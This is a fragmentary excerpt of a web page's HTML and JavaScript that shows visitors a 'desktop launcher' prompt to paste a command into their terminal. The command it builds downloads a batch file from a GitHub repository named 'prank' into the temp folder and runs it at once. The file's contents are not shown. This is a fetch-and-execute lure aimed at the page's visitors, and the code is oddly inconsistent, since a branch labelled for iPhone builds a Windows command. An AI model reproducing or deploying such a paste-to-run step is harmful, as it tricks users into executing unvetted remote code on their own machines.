...
<div id="desktop-container">
  ...
  <div id="desktop-launcher">
    ...
    <div class="dt-row" style="margin-top: 16px; color: #ffd228; font-weight: bold;">
      &gt; PASTE THIS COMMAND INTO YOUR TERMINAL TO RUN:
    </div>
...
window.addEventListener("DOMContentLoaded", () => {{
  ...
  if (device === "iphone") {{
    ...
    const cmdStr = 'curl -sSL https://raw.githubusercontent.com/pmkaulani/prank/main/launch.bat -o "%TEMP%\\\\launch.bat" && "%TEMP%\\\\launch.bat"';
